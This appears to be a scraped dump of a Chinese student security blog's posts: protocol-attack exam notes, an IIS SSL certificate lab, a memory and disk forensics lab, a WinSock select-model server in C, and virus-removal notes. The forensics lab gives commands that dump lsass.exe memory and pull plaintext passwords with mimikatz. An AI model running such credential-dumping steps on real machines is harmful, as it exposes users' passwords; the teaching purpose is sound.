防火墙能重组分段的数据报，检查其内容 用定向广播的目的地址的IP数据报来攻击不同类型的主机 配置路由时进制发送定向广播数据包的功能 ARP协议 地址解析协议（address resolution protocol , ARP）根据IP地址获取物理地址（MAC地址）的TCP&#x2F;IP协议 ARP欺骗 应在交换机上配置802.1x协议，这样攻击者连接交换机的时候需要进行身份认证； 建立静态ARP表 ICMP协议 控制报文协议（internet control message protocol），错误处理、消息处理协议 通知主机到底目的地的最佳路径，报告路由故障 监控工具ping和tracert的重要组成部分 是差错和控制报文协议，用于传输差错报文和控制报文 ICMP重定向攻击 利用ICMP对消息进行重定向，使目标主机受到连接劫持和拒绝服务等攻击； 重定向消息一般由仅主机来进行。仅当消息直接来自路由器的时候，才由路由器进行重定向。若当网管使用ICMP来创建通往目的地址的新路由，会产生安全问题 ICMP路由器发现攻击 ICMP在进行路由发现的时候，并不会对应答方进行验证。可能会遭受中间人攻击，假冒是应答方。 防火墙穿越攻击 攻击者穿越防火墙的访问控制列表和规则集，获取过滤的内容和方式。 传输层（传输层） 仅为梗概，详情见goodnotes TCP 控制传输协议（Transmission Control Protocol，TCP）面向连接的可靠的传输层协议 建立连接时三次握手 存在的攻击方式 SYN Flood 发生在三次握手过程中。 一种不能建立正常的连接，使用户得不到响应的Dos攻击。 攻击者不断向服务器发送TCP的连接请求SYN，使其处于半开放状态，无法接受其他的正常连接。 应该在服务器前端部署安全防护，如防火墙，来过滤掉数据包 TCP会话劫持 由于TCP协议不对数据包进行加密和认证而发生的，获取非授权的权限的攻击方式 TCP确定数据包是否真实，是根据数据包中的32位序列号。如果攻击者能预测目标主机的起始序列号，伪造有效接收窗口报文，就能欺骗主机 应该在TCP建立连接时，用一个随机数作为起始序列号 拥塞控制攻击 发生在建立连接后的数据阶段，利用TCP拥塞控制，降低正常传输能力的一种攻击 TCP的拥塞控制是为了防止过多的数据注入网络，攻击者会制造关键节点的拥塞以触发该机制。使其触发窗口慢启动，来降低正常的传输能力。 网管应该实时监控网络异常流量 欺骗IP地址获得远程非法授权访问 （综合运用SYN Flood和TCP会话劫持） B授予A某些权限，X要得到与A相同的权限 X假冒A和B建立连接，（X假冒A的IP地址），使B相信消息是A发来的 阻止A向B报告网络认证系统的故障 UDP 用户数据报协议（User Datagram Protocol，UDP）无连接的传输层协议，提供面向事务的不可靠信息传送 特点 无需连接传输高效 无拥塞控制的不可靠传输 数据报首部仅8字节 网络拥塞不会降低发送速率 安全问题 UDP Flood —-大量包阻塞目标主机 向攻击目标发送大量UDP小包，使网络设备忙于应对UDP报文，系统资源使用率飙高，设备不能提供正常服务或直接死机。 防护： 根据攻击包大小，设定包碎片重组大小，通常不小于1500 攻击端口是业务端口，设置UDP最大包来过滤异常流量 攻击端口为非业务端口，先建立TCP连接 UDP Fraggle攻击 ——正常响应阻塞目标主机 向子网广播地址发送UDP包，端口号为7，目的是占用目标主机网络带宽 攻方IP地址&#x3D;广播地址 若开启功能：广播地址的所有主机，向目标主机返回收到的包，使其不断回应UDP报文呢，系统资源使用率飙增，不能正常服务或死机。 若关闭功能：每一个都生成ICMP不可达信息，大量ICMP拥塞网络 防护：进入防火墙，目的端口为7或19的UDP报文拒绝 应用层（应用层、表示层、会话层） HTTP（端口TCP 80） 超文本传输协议（Hyper Text Transfer Protocol，HTTP）客户端和服务器端请求和应答的标准 明文传输 安全隐患 传输的是明文，没有加密，网络嗅探工具就可以获取传输数据 无状态连接，唯一的完整性检验是检查报文头部的数据传输长度。可发动中间人攻击 防护措施 在TCP和HTTP传输之间增加安全层（SSL、TLS） TELNET（端口 TCP 23） 远程登录协议（Teletype Network）是Internet远程登录服务的标准协议和主要方式 安全隐患及防护措施 攻击者记录整个会话或者登陆的口令 劫持会话，认证完成后进行篡改 应该对会话进行加密 SSH （端口 TCP 22） 安全壳协议（Secure Shell）在不安全网络上建立安全远程登录或其他网路服务的协议 建立TCP连接→版本协商 → 算法协商→服务器认证和密钥建立 →用户认证 → 通信会话 支持身份认证和数据加密 可提供安全隧道，防止中间人攻击 安全问题 服务器认证：在不可信的环境下，不能对服务器真实性进行认证 应该要验证主机密钥来验证服务器的正确性 协议版本协商：可能存在对有漏洞的版本进行攻击 对版本上有安全问题的通讯方，中断TCP连接 主机密钥文件安全：密钥被窃取或篡改，实施攻击 应加强对密钥文件的管理 PGP 安全电子邮件标准 POP3 FTP SMTP 第三章 安全协议两个或两个以上的参与者为完成某项特定的任务而采取的一系列步骤。 协议三要素 依次执行 至少两个参与者 通过执行协议，必须能完成某项任务 仲裁协议公正、可信赖","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"网络安全技术","slug":"期末考试/网络安全技术","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"基于Web的SSL连接设置","slug":"基于Web的SSL连接设置","date":"2020-12-21T20:14:42.000Z","updated":"2024-11-12T07:00:13.000Z","comments":true,"path":"2020/12/22/基于Web的SSL连接设置/","permalink":"https://gryffinbit.top/2020/12/22/%E5%9F%BA%E4%BA%8EWeb%E7%9A%84SSL%E8%BF%9E%E6%8E%A5%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"实验四：基于Web的SSL连接设置实验目的：学习基于Web的SSL连接设置，加深SSL的理解 实验原理：数字证书概念 将用户身份ID与其所持有的公钥PK绑定，再由CA对该身份及对应公钥的组合{ID||PK}进行数字签名得到S，将{签名S||身份ID||公钥PK}加以存储。 实验内容：Web服务器证书的申请和安装（步骤要点） 配置Web服务器（管理工具，Internet信息管理，IIS） 新建网站（“网站”右键，注意IP地址选择，读写等权限） 暂停新建的网站，启用根CA默认网站 新建网站属性，证书服务向导生成“证书申请书” Web证书服务向导 再在右键属性中，目录安全性，证书服务器 企业根CAIP&#x2F;certsrv，递交证书申请书，根CA生成证书并下载。 新建网站属性，启用Web证书 客户端验证证书 实验环境：宿主机： macOS Catalina 虚拟机：Windows Sever 2003 实验过程：1.新建Web服务器网站预先配置：配置服务器，并开启IIS服务 管理工具→Internet信息管理→IIS 新建网站（“网站”右键，注意IP地址选择，读写等权限） 局域网卡IP 2. Web服务器生成“证书申请书新建网站属性，证书服务向导生成“证书申请书”，进入Web证书服务向导 右键属性→目录安全性→服务器证书 IIS证书向导 新建证书→现在准备证书请求（证书名称、部门）→生成“证书请求文件”（用于向根CA申请证书） 3. 递交“证书申请书”并获取证书企业根CAIP&#x2F;certsrv，递交证书请求文件，根CA生成证书并下载。 高级证书申请→使用base64编码→复制证书请求文件内容→粘贴进网页空白→提交 企业根CAIP&#x2F;certsrv，递交证书请求文件，根CA生成证书并下载。 证书颁发→下载本地 4. 应用Web服务器证书新建网站属性，启用Web证书 属性中→目录安全性→证书服务器→处理挂起请求并安装证书→确认SSL端口443 证书摘要，属性可以查看 属性中→目录安全性→编辑“要求安全通道”→客户端“忽略客户端证书” （客户端拥有证书之后，可以接受或要求） 5. 客户端验证Web服务器证书暂停根CA默认网站，启用新建的网站 客户端浏览器，http:&#x2F;&#x2F;企业根CAIP，受到SSL提醒 客户端浏览器，https:&#x2F;&#x2F;企业根CAIP 客户端验证证书 客户端浏览器，https:&#x2F;&#x2F;企业根CAIP","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"网络安全技术","slug":"实验/网络安全技术","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://gryffinbit.top/tags/SSL/"}],"author":"Gryffinbit"},{"title":"活取证和死取证","slug":"活取证和死取证","date":"2020-12-19T09:34:51.000Z","updated":"2024-11-12T07:00:15.000Z","comments":true,"path":"2020/12/19/活取证和死取证/","permalink":"https://gryffinbit.top/2020/12/19/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/","excerpt":"","text":"活取证和死取证实验软件下载https://gryffinbit.lanzous.com/iZMymji46yb 镜像下载： 链接: https://pan.baidu.com/s/1u4yOjEbeioWxBukyKXzq-A 密码: b09h kali-linux-2020.2-live-amd64 实验目的1.理解“活取证”和“死取证”两类技术的差别和应用场合 2.掌握“活取证”和“死取证”基本工具的使用方法 实验环境：kali-Linux debian8 Windows 7 professional 实验内容：一.活取证: 从内存还原文字 从内存还原图片 从内存中提取明文密码 二.死取证: 使用Kali live 制作光盘镜像 使用 Autopsy 对硬盘镜像进行分析 实验过程：实验 1:使用 procdump+ strings 从内存中还原文字👉 Win7 系统下进行实验，以记事本程序为例。 👉打开一个记事本，查看该程序的映像名和PID等信息。打开cmd，输入命令。然后找到notepad.exe 1tasklist 👉使用 procdump 工具提取 notepad 程序在内存中的镜像 💡cd 到procdump64.exe 所在文件夹 1procdump64.exe -ma notepad.exe notepad.dmp 👉使用 strings 工具提取出其中的字符串，找到有用信息。 1strings.exe notepad.dmp &gt; result.txt 💡这不仅适用于 notepad 程序，只要当前系统中正在使用的文字处理软件，如:word、 outlook(邮件)等，都可以用相同的方法 dump 内存中数据内容。 实验 2:从内存还原图片 从图画工具中打开 👉用画图工具打开一幅图片，画图工具程序名是“mspaint.exe” 👉用procdump抓取内存中的内容 1procdump64.exe -ma mspaint.exe mspaint.dmp 👉分析处理 mspaint.dmp 文件还是需要在 kali 系统中进行，将其拷贝到 kali 系统: 👉kali 下提取图像信息使用的工具是 gimp(photoshop 的 linux 版) 为避免找不到gimp包，先进行修复 12apt --fix-broken install apt-get install gimp 👉给mspaint.dmp 改名为 mspaint.data gimp不能直接打开dmp文件，但是可以打开data文件，两种类型本质是一样的， 我们把抓取的 mspaint.dmp 改名为 mspaint.data 1mv mspaint.dmp mspaint.data 👉然后用 gimp 打开 mspaint.data 打开后显示的图片是一团混乱的像素点，通过调节宽度、高度以及位移三个参数，从混乱中寻找可能的图像 💡如果我们知道元素图片的宽度和高度信息，可以先设定好这两个参数， 调节位移一个参数就可以了。（作弊方法) 左上角找到gimp，运行 打开data文件 调整宽度、高度（已知这个图片是3840*2160） 调整位移到合适的位置，显示完整图片 从远程桌面打开 👉在目标系统中启动 mstsc(远程桌面程序)并登陆一台远程计算机 👉抓取远程桌面的内存数据 如果连接上远程计算机后，远程计算机的桌面都是以图像的形式在本地目标系统的 mstsc 程序中显示和处理，现在我们抓取远程桌面的内存数据: 1procdump64.exe -ma mstsc.exe mstsc.dmp 👉把 mstsc.dmp 拷贝到 kali 系统中进行处理 处理过程与前面的例子是一样的，通过调整参数，可以获取下图的图像: 实验3: 从内存中提取明文密码👉从管理用户令牌程序的内存提取用户密码 Windows系统中当用户登陆后，系统会启动一个叫做lsass.exe的程序，管理用户令牌，在 lsass 程序中会存储有用户的明文密码，我们现在尝试使用 procdump 从 这个程序的内存中提取用户的密码。 💡注意要以管理员权限打开终端程序 1procdump64.exe -ma lsass.exe lsass.dmp 👉获取到 dmp 文件后，使用 mimikatz 进行密码提取。 把 lsass.dmp 文件拷贝到 mimikatz.exe 所在文件夹，双击打开 mimikatz.exe 程序。 输入::回车，可以查看 mimikatz 所有的模块，我们需要使用的模块是 sekurlsa。 在依次使用命令 12sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords 就可以将用户密码提取出来 实验4:死取证 使用 Live 版 Kali 系统中的 Guymager 来创建一台 Win7 虚拟机的硬盘镜像 👉首先要将 Live 版 Kali 的 iso 文件装载到 Win7 虚拟机 👉启动虚拟机，让电脑从光盘启动，进入 Live 版的 Kali 系统。 👉选择进入 kali(取证模式)系统 👉打开 guymager 程序: 右键，选择acquire image 选择start开始取证进程。 使用 Autopsy 对硬盘镜像进行分析 Autopsy 是 Kali Linux 预安装的一款磁盘镜像分析工具。该工具可以对磁盘镜像 的卷和文件系统进行分析，支持 Unix 和 Windows 系统。Autopsy 是一个命令行 工具，也提供基于浏览器的图形界面。用户使用该工具，可以很轻松浏览镜像中的目录和文件，甚至是已删除的文件。同时，该工具提供强大的分析功能，允许用户直接分析磁盘块，关键字搜索，文件分类过滤。针对数字取证，该工具提供 镜像完整性验证、文件 MD5 比对、文件操作时间表、报告生成功能。 这里我们介绍 Autopsy 基于浏览器-服务器架构的使用方式。 👉在 kali 终端输入 autopsy 回车，会启动 autopsy 的服务器端 👉打开网页 该服务器在端口 9999 进行侦听，可以使用浏览器访问。在浏览器地址栏输入上面网址，可以看到下面操作界面: 👉新建case 这款软件是按照网络犯罪取证的过程来设计的，所有操作都是以 case 作为基本 单元，首先要先创建一个新的 case: 点击 NewCase 后，会提示新的 case 创建好了，显示文件目录和配置文件存放位置 👉为这个 case 添加主机信息 点击 ADD HOST 后，在下个页面完善主机信息:(这些信息不是必填的) 下面是将硬盘镜像上传到新建的 case 中，点击 ADD IMAGE: (在这个实验中，我们使用网上的一个镜像——计算机取证参考数据集，下载网 址:http://www.cfreds.nist.gov/Controlv1_0/control.dd) control.dd只是一个磁盘的分区。 注意，将control.dd放在这里填写的位置，root文件下 Import Method 三种方式:symlink(镜像放在原位置&#x2F;root 中，如镜像文件移动， 这个 case 就无法再找到这个镜像继续进行分析了)，Move(把镜像从原位置剪 切到 Autopsy 的 evidence locker 中，evidence locker 可以对其中的数据进行写保 护，但是如果 move 过程中如果断电，镜像会被损坏)，Copy(把镜像从拷贝一 份到 Autopsy 的 evidence locker 中，比较保险，一般选 copy) 更多信息请访问 http://www.cfreds.nist.gov","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"},{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"基于select模型的TCP服务器","slug":"基于select模型的TCP服务器","date":"2020-12-18T16:22:59.000Z","updated":"2024-11-12T07:00:14.000Z","comments":true,"path":"2020/12/19/基于select模型的TCP服务器/","permalink":"https://gryffinbit.top/2020/12/19/%E5%9F%BA%E4%BA%8Eselect%E6%A8%A1%E5%9E%8B%E7%9A%84TCP%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"基于select模型的TCP服务器实验工程文件下载https://gryffinbit.lanzous.com/iSR7Gjhg68b 实验目的 熟悉非阻塞套接字的工作模式 理解select模型的基本思路 实验环境Windows10 x64，Visual Studio 2017 实验要求将第三章的点对点的C&#x2F;S模型改用select模型。为了方便理解，我们只是关注可读套接字，也就是select函数的第三个和第四个参数均为NULL。 实验原理（模型）select的函数1234567int select( int nfds, fd_set FAR* readfds, fd_set FAR* writefds, fd_set FAR* exceptfds, const struct timeval FAR* timeout); fd_set数据类型，代表着一系列特定套接字的集合。 nfds ： 为保持与早期套接字应用程序兼容。 readfds： 用于检查可读性。该集合包括想要检查是否符合下述任何一个条件的套接字。 有数据到达，可以读入 连接已关闭、重设或中止 假如已调用了listen，而且一个连接正在建立，那么accept函数调用会成功。 wirtefds：用于检查可写性。该集合包括想要检查是否符合下述任何一个条件的套接字。 发送缓冲区已空，可以发送数据。 如果已完成了对一个非锁定连接调用的处理，连接就会成功。 exceptfds：用于检查带外数据。该集合包括想要检查是否符合下述任何一个条件的套接字。 假如已完成了对一个非锁定连接调用的处理，连接尝试就会失败。 有带外（out-of-band，OOB）数据可供读取 timeout：是一个指向一个timeval结构的指针，用于决定select等待I&#x2F;O操作完成的最长时间。如果timeout是一个空指针，那么select调用会无限制地等待下去，直到至少有一个套接字符合制定的条件后才结束。 timeval结构的定义1234strcut timeval&#123; long tv_sec; //以秒为单位指定等待时间 long tv_usec; //以毫秒为单位指定等待时间&#125;; select模型的操作步骤用select操作一个或多个套接字句柄，一般采用下述步骤。 使用FD_ZERO宏，初始化自己感兴趣的每一个fd_set集合。 使用FD_SET宏，将要检查的套接字句柄添加到自己感兴趣的每哥fd_set集合中，相当于在指定的fd_set集合中，设置好要检查的I&#x2F;O活动。 调用select函数，然后等待。select完成返回后，会修改每个fd_set结构，删除那些不存在待决I&#x2F;O操作的套接字句柄，在各个fd_set集合中返回符合条件的套接字。 根据select的返回值，使用FD_ISSET宏，对每个fd_set集合进行检查，判断一个待定的套接字是否仍在集合中，便可判断出哪些套接字存在着尚未完成的I&#x2F;O操作。 知道了每个集合中未完成的I&#x2F;O操作之后，对相应的套接字的I&#x2F;O进行处理，然后返回步骤1，继续进行select处理。 实验过程 将客户端中调用recv函数的部分都删掉，也就是客户端只能给服务器发消息，不能接收消息。 select模型也需要引用头文件库文件，打开网络库，校验版本，创建监听套接字，绑定地址，开始监听，然后创建一个fd_set结构体，并把监听套接字放这个集合中。 在一个死循环中调用select函数，并判断select的返回值。 若返回值为SOCKET_ERROR，则报错并做相应处理； 若返回值为0, 则继续； 若返回值大于0，说明select函数有反应。有反应就要区分是监听套接字还是响应套接字导致的。若是监听套接字导致的，就调用accept函数，创建一个新的响应套接字，并把这个响应套接字放到第2步定义的fd_set结构当中。如果是响应套接字，就调用recv函数接收客户机发来的消息。 最后释放掉所有的套接字，并关闭网络库 测试。先开始运行select模型，然后在客户端的Debug&#x2F;Release文件夹中双击exe文件即可打开多个客户端，这些客户端均可给服务器发消息。 测试完成后，可以在accept函数之后调用send函数，发消息给客户端提示连接成功。相应的，就需要先在客户端调用recv函数接收此消息。 👉创建服务器端 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#include &lt;WS2tcpip.h&gt;//winsock2.h转到文档，可以查看当且编译器环境支持的最高版本//引用库文件#pragma comment(lib,&quot;Ws2_32.lib&quot;)int main(void)&#123; //打开网络库 WORD wdVersion = MAKEWORD(2, 2); WSADATA wsaData; if (0 != WSAStartup(wdVersion, &amp;wsaData)) &#123; printf(&quot;WSAStartup fail!&quot;); return -1; &#125; //校验版本 if (2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion)) &#123; printf(&quot;Version fail!&quot;); //关闭库 WSACleanup(); return -1; &#125; //创建监听套接字 SOCKET socketListen = socket(AF_INET, SOCK_STREAM, 0); if (SOCKET_ERROR == socketListen) &#123; printf(&quot;socket fail!&quot;); //关闭库 WSACleanup(); return -1; &#125; //绑定地址 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET;//通信域为IPV4 //sockAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);//回送地址，主要用于网络软件测试以及本地机进程间通信 inet_pton(AF_INET, &quot;127.0.0.1&quot;, (void*)&amp;sockAddress.sin_addr); sockAddress.sin_port = htons(51314); if (SOCKET_ERROR == bind(socketListen, (struct sockaddr*)&amp;sockAddress, sizeof(sockAddress))) &#123; printf(&quot;bind fail!&quot;); //关闭监听套接字 closesocket(socketListen); //关闭库 WSACleanup(); return -1; &#125; //开始监听 if (SOCKET_ERROR == listen(socketListen, 5)) &#123; printf(&quot;listen fail!&quot;); //关闭监听套接字 closesocket(socketListen); //关闭库 WSACleanup(); return -1; &#125; //申明一个fd_set结构体存放套接字，可以右键转定义查看它的结构 fd_set allSockets; //初始化 FD_ZERO(&amp;allSockets); //把监听套接字放到fd_set这个集合中 FD_SET(socketListen, &amp;allSockets); while (true) &#123; //由于给select传入一个fd_set结构体，它只返回fd_set中有响应的套接字，所以需要定义一个中转变量 fd_set TempSockets = allSockets; //最大等待时间 struct timeval st; st.tv_sec = 10; st.tv_usec = 0; //调用select函数，这里我们将第三个和第四个参数设为了NULL， //即只是关心可读的套接字，也就是调用accept和recv的情况 int ret = select(0, &amp;TempSockets, NULL, NULL, &amp;st); //判断select的返回值分为SOCKET_ERROR，0, 和大于0三种情况 if (ret == SOCKET_ERROR) &#123; printf(&quot;select fail！&quot;); break; &#125; if (0 == ret) //没有反应，继续 &#123; continue; &#125; if (ret &gt; 0) &#123; //select函数有反应，有反应就要区分是监听套接字还是响应套接字导致的 for (u_int i = 0; i &lt; TempSockets.fd_count; i++) &#123; //是监听套接字导致的 if (TempSockets.fd_array[i] == socketListen) &#123; //需要创建响应套接字 SOCKET SockAccept = accept(socketListen, NULL, NULL); //判断accept函数是否调用失败，失败的返回值是INVALID_SOCKET，不是SOCKET_ERROR if (SockAccept == INVALID_SOCKET) &#123; //创建响应套接字失败 printf(&quot;创建响应套接字失败！&quot;); continue; &#125; //把新创建的响应套接字也放到fd_set集合中 FD_SET(SockAccept, &amp;allSockets); //给客户端发消息 if (SOCKET_ERROR == send(SockAccept, &quot;我是服务器，您已成功连接&quot;, strlen(&quot;我是服务器，您已成功连接&quot;), 0)) &#123; printf(&quot;send fail!&quot;); //关闭响应套接字 closesocket(SockAccept); //关闭库 WSACleanup(); return -1; &#125; &#125; else &#123; //是响应套接字导致的,那就需要调用recv函数 //判断客户端连接的集合中是否有需要接收的数据 char szRecvBuffer[1024] = &#123; 0 &#125;; int nReturnValue = recv(TempSockets.fd_array[i], szRecvBuffer, sizeof(szRecvBuffer) - 1, 0); if (0 == nReturnValue) &#123; //客户端正常关闭 printf(&quot;客户端已下线&quot;); //从集合中删掉Socket，还得调用closesocket关闭这个socket SOCKET SockTemp = TempSockets.fd_array[i]; FD_CLR(TempSockets.fd_array[i], &amp;allSockets); closesocket(SockTemp); &#125; else if (SOCKET_ERROR == nReturnValue) &#123; //网络中断 int nRes = WSAGetLastError(); printf(&quot;响应套接字%d所对应的客户端中断连接\\n&quot;, TempSockets.fd_array[i]); //同样需要从集合删掉套接字和关闭它。 &#125; else &#123; //接收到客户端消息 printf(&quot;Data from Socket %d : %s \\n&quot;, TempSockets.fd_array[i],szRecvBuffer); &#125; &#125; &#125; &#125; &#125; //释放所有socket for (u_int i = 0; i &lt; allSockets.fd_count; i++) &#123; closesocket(allSockets.fd_array[i]); &#125; //关闭网络库 WSACleanup(); system(&quot;pause&quot;); return 0;&#125; 👉创建客户端 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#include &lt;WS2tcpip.h&gt;#pragma comment(lib,&quot;Ws2_32.lib&quot;)int main()&#123; //打开网络库 WORD wdVersion = MAKEWORD(2, 2); WSADATA wsaData; if (0 != WSAStartup(wdVersion, &amp;wsaData)) &#123; printf(&quot;WSAStartup fail!&quot;); return -1; &#125; //校验版本 if (2 != HIBYTE(wsaData.wHighVersion) || 2 != LOBYTE(wsaData.wVersion)) &#123; printf(&quot;Version fail!&quot;); //关闭库 WSACleanup(); return -1; &#125; //创建一个SOCKET 监听 //套接字的类型，使用的协议一定要和服务器的类型和协议匹配上 SOCKET socketUser = socket(AF_INET, SOCK_STREAM, 0); if (SOCKET_ERROR == socketUser) &#123; printf(&quot;socket fail!&quot;); //关闭库 WSACleanup(); return -1; &#125; //初始化服务器端的地址，IP和端口一定要和想要连接的服务器一样，不然就连接不上 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; //IPv4的协议 //sockAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); inet_pton(AF_INET, &quot;127.0.0.1&quot;, (void*)&amp;sockAddress.sin_addr); //服务器地址 sockAddress.sin_port = htons(51314); //服务器的端口 //客户机端主动连接服务器端 if (SOCKET_ERROR == connect(socketUser, (struct sockaddr*)&amp;sockAddress, sizeof(sockAddress))) &#123; printf(&quot;connect fail!\\n&quot;); //int a=WSAGetLastError(); //printf(&quot;error code : %d\\n&quot;, a); //关闭套接字 closesocket(socketUser); //关闭库 WSACleanup(); return -1; &#125; //接收服务器返回的信息 char szBuffer[1024] = &#123; 0 &#125;; //接收数据， 跟服务器端一样 int nReturnValue = recv(socketUser, szBuffer, sizeof(szBuffer), 0); if (0 == nReturnValue) &#123; //客户端正常关闭 释放Socket closesocket(socketUser); &#125; else if (SOCKET_ERROR == nReturnValue) &#123; //网络中断 printf(&quot;连接中断&quot;); &#125; else &#123; //接收到客户端消息 printf(&quot;server data : %s\\n&quot;, szBuffer); //发送消息给服务器 while (1) &#123; //发送数据， 跟服务器端一样 char szSendData[1024] = &#123; 0 &#125;; printf(&quot;Input Something : &quot;); scanf_s(&quot;%s&quot;, szSendData, 1024); if (SOCKET_ERROR == send(socketUser, szSendData, strlen(szSendData), 0)) &#123; printf(&quot;send fail!&quot;); //关闭客户机Socket closesocket(socketUser); //关闭库 WSACleanup(); return -1; &#125; &#125; &#125; //关闭socket closesocket(socketUser); //关闭网络库 WSACleanup(); system(&quot;pause&quot;); return 0;&#125; 👉最后运行客户端，生成解决方案之后，到工程文件夹里找到exe，开启多个客户端。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"网络编程","slug":"实验/网络编程","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"}],"author":"Gryffinbit"},{"title":"病毒原理考点","slug":"病毒原理考点","date":"2020-12-17T10:05:09.000Z","updated":"2024-11-12T07:00:20.000Z","comments":true,"path":"2020/12/17/病毒原理考点/","permalink":"https://gryffinbit.top/2020/12/17/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86%E8%80%83%E7%82%B9/","excerpt":"","text":"病毒原理考点病毒程序一般基入对象的侵入一般有哪几种方式。（对象的不同有哪几种 磁盘引导区传染的计算机病毒 操作系统传染 可执行程序传染 计算机病毒的特点 计算机病毒特征1：传染性 可以通过中介进行传染，如U盘、光盘、电子邮件等等。 计算机病毒特征2：破坏性 可以影响我们计算机上程序的正常运行，删除我们的文件。 计算机病毒特征3：隐蔽性 计算机病毒的本身大小很小，，它通常衣服在在正常程序之中或磁盘引导扇区中，病毒会想方设法隐藏自身。 计算机病毒特征4：潜伏性 有些病毒并不会立刻发作，而是悄悄的隐藏起来，然后在用户不察觉的情况下进行传染。 计算机病毒特征5：触发性 有些病毒被设置了一些条件，只有当满足了这些条件时才会实施攻击。比较常见的就是日期条件了。 什么叫计算机病毒计算机病毒,是指编制或者在计算机程序中插入的破坏计算机功能或者毁坏数据,影响计算机使用,并能自我复制的一组计算机指令或者程序代码。 计算机病毒怎么清除针对于特定病毒的清除 引导型： 病毒代码放入软盘或硬盘的BOOT区，或硬盘的主引导区。 做法：用正常的分区表信息覆盖病毒。将病毒在文件分配表中设置的坏簇，修改回好簇，使磁盘空间可以供操作系统分配使用。 文件型： 病毒码放在宿主程序的前或后部，代码和宿主程序有明显的分界线。检查是否被修改。 .COM：将染毒文件读入内存，找出分界线，将修改过的代码复原，将修复后的宿主程序写回磁盘。 .EXE：将染毒文件读入内存，找出分界线，因为exe头部被读入内存，代码地址有变。加载程序后的起始运行地址、程序长度等，根据计算结果修改头部对应参数。将代码复原，设置恰当的文件长度和地址参数，写回磁盘。 文件与引导复合型： 依附在可执行文件上，当作载体进行传播，当运行时，系统中有硬盘，则立即感染主引导区，以后用硬盘启动系统时，就有该病毒。 做法：将硬盘主引导区内病毒清除；记录执行程序的起始地址，终止地址，清除病毒代码。将文件长度改为清毒后的长度。 脚本计算机病毒： 做法： 禁用文件系统对象 卸载Windows Scripting Host 删除VBS、VBE、JS、JSE文件后缀名与应用程序的映射 在Windows目录中，找到WScript.exe，更改名称或删除 浏览器ActiveX控件设为禁用 禁止OE自动收发电子邮件 显示所有文件扩展名 将网络连接安全级别设置为中等以上 宏病毒： 查看noraml.dot，删除来历不明的宏 查看noraml.dot，用原文件覆盖被感染的 特洛伊木马病毒： 备份重要数据 立即关闭设备电源 备份木马入侵现场 修复木马危害 蠕虫病毒： 与防火墙互动 交换机联动 通知HIDS（基于主机的入侵监测） 报警 笼统性病毒的清除方式 基本方法 简单的工具治疗：winhex、debug，将病毒代码从软件中摘除 专用工具治疗：根据对病毒特征的记录，自动清除感染程序中的病毒代码 一般过程 剖析病毒样本：掌握病毒的特征，准确识别病毒 研制病毒试验样本：对清除软件进行多次修改和调试 摘除病毒代码 杀毒的方式 清除被感染文件 删除病毒文件 禁止访问病毒文件 病毒删除后移到隔离区 不知道是不是病毒时，不处理 什么是宏病毒，它感染的文件是那些？特点是什么？检测方法、清除方法是什么？宏病毒：寄在文档或模板的宏中的计算机病毒，一旦打开这样的文档，宏就会被执行，宏病毒被激活后，转移到用户的计算机上，并驻留在normal模板，从此所有自动保存的文档都会染上宏病毒。 感染文件：Office家族三大系列。 特点： 传播速度极快 制作、变种方便 破坏性极大 多平台交叉感染 检测方法： 在word中，选中normal看有没有一些名字奇怪的自动宏 不进行操作退出，提示存盘，可能是normal.dot中带毒 word工具栏中，无“宏” word运行中，内存不足，打印不正常 运行word时，提示是否启动宏 清除： 查看noraml.dot，删除来历不明的宏 